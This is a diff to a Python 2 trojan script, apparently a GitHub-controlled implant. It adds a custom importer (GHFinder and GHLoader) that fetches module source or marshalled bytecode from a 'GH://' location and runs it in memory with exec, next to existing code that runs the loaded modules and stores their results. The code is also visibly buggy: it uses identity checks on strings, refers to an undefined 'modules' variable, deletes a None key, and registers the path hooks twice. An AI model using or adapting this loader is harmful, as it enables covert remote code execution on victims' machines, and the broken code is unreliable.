@@ -8,6 +8,7 @@ import base64
 import sys
 import time
 import imp
+import marshal
 import random
 import threading
 import Queue
@@ -95,6 +96,160 @@ class GitImporter(object):
         return module
 
 
+gmodules = {}
+gh_package = True
+
+
+class GHLoader(object):
+
+    def __init__(self, fullname, contents, ext, is_pkg, path):
+        self.fullname = fullname
+        self.contents = contents
+        self.ext = ext
+        self.is_pkg = is_pkg
+        self.path = path
+        self.archive = ''
+
+    def load_module(self, fullname):
+        imp.acquire_lock()
+        try:
+            if fullname is sys.modules:
+                return sys.modules[fullname]
+            mod = None
+            c = None
+            if self.ext is 'py':
+                mod = imp.new_module(fullname)
+                mod.__name__ = fullname
+                mod.__file__ = 'GH://{}'.format(self.path)
+                if self.is_pkg:
+                    mod.__path__ = [mod.__file__.rsplit('/', 1)[0]]
+                    mod.__package__ = fullname
+                else:
+                    mod.__package__ = fullname.rsplit('.', 1)[0]
+                code = compile(self.contents, mod.__file__, 'exec')
+                exec(code, mod.__dict__)
+
+            elif self.ext in ('pyc', 'pyo'):
+                mod = imp.new_module(fullname)
+                mod.__name__ = fullname
+                mod.__file__ = 'GH://{}'.format(self.path)
+                if self.is_pkg:
+                    mod.__path__ = [mod.__file__.rsplit('/', 1)[0]]
+                    mod.__package__ = fullname
+                else:
+                    mod.__package__ = fullname.rsplit('.', 1)[0]
+                sys.modules[fullname] = mod
+                exec(marshal.loads(self.contents[8:]), mod.__dict__)
+            # elif self.ext in ('dll', 'pyd', 'so'):
+            #     init_name = 'init' + fullname.rsplit('.', 1)[-1]
+            #     path = self.fullname.rsplit('.', 1)[0].replace('.', '/') + '.' + self.ext
+            #     mod =
+        except Exception:
+            if fullname in sys.modules:
+                del sys.modules[fullname]
+        finally:
+            self.contents = None
+            imp.release_lock()
+        return sys.modules[fullname]
+
+
+class GHImportErr(ImportError):
+    pass
+
+
+class GHFinder(object):
+    search_lock = None
+    search_set = set()
+
+    def __init__(self, path=None):
+        if path and not path.startswith('GH://'):
+            raise GHImportErr()
+
+    def find_module(self, fullname, path=None, second=False):
+        global gmodules
+        global gh_package
+
+        print fullname
+        print path
+
+        def get_module_files(fullname):
+            """ return the file to load """
+
+            path = fullname.replace('.', '/')
+
+            files = [
+                module for module in gmodules.iterkeys() \
+                if module.rsplit(".", 1)[0] == path or any([
+                    path + '/__init__' + ext == module for ext in [
+                        '.py', '.pyc', '.pyo'
+                    ]
+                ])
+            ]
+
+            if len(files) > 1:
+                # If we have more than one file, than throw away dlls
+                files = [x for x in files if not x.endswith('.dll')]
+
+            return files
+        imp.acquire_lock()
+        selected = None
+        try:
+            files = get_module_files(fullname)
+            ghfiles = [
+                lambda f: any([
+                    f.endswith('/__init__'+ext) for ext in [
+                        '.pyo', '.pyc', '.py'
+                    ]
+                ]),
+                lambda f: any ([
+                    f.endswith(ext) for ext in [
+                        '.pyo', '.pyc'
+                    ]
+                ]),
+                lambda f: any ([
+                    f.endswith(ext) for ext in [
+                        '.pyd', '.py', '.so', '.dll'
+                    ]
+                ]),
+            ]
+
+            selected = None
+            for gh in ghfiles:
+                for pyfile in files:
+                    if gh(pyfile) and pyfile in modules:
+                        selected = pyfile
+                        break
+
+            if not selected:
+                return None
+
+            content = modules[selected]
+            ext = selected.rsplit('.', 1)[1].strip().lower()
+            is_pkg = any([
+                selected.endswith('/__init__' + ex) for ex in ['.pyo', '.pyc', '.py']
+            ])
+
+            return GHLoader(fullname, content, ext, is_pkg, selected)
+
+        except Exception as e:
+            raise e
+
+        finally:
+            del gmodules[selected]
+            imp.release_lock()
+
+
+sys.meta_path = [GitImporter()]
+sys.path_hooks.append(GHFinder)
+sys.path.append('GH://')
+# sys.path.append('gh://')
+
+sys.path_hooks.append(GitImporter())
+sys.path.append('GH://')
+# sys.path.append('gh://')
+# sys.meta_path = [GitImporter()]
+
+
 def module_runner(module):
     task_queue.put(1)
     result = sys.modules[module].run()
@@ -103,9 +258,6 @@ def module_runner(module):
     store_module_result(result)
 
     return
-
-
-sys.meta_path = [GitImporter()]
 
 
 while True:
